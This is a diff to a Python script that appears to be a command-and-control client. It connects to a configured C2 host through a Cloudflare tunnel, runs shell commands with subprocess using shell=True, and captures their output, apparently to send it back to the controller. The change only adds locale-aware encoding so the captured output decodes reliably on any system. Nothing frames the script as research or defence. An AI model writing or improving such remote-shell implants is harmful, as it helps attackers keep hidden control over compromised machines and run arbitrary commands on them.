@@ -2,6 +2,7 @@ import subprocess
 import threading
 import socketio
 import time
+import locale
 from config import C2_HOST, C2_PORT, MACHINE_ID
 C2_URL = C2_HOST  # port handled by Cloudflare tunnel, no need to append
 
@@ -24,7 +25,9 @@ def make_client():
                 shell=True,
                 capture_output=True,
                 text=True,
-                timeout=10
+                timeout=10,
+                encoding=locale.getpreferredencoding(),
+                errors="replace"
             )
             output = result.stdout + result.stderr
         except subprocess.TimeoutExpired:
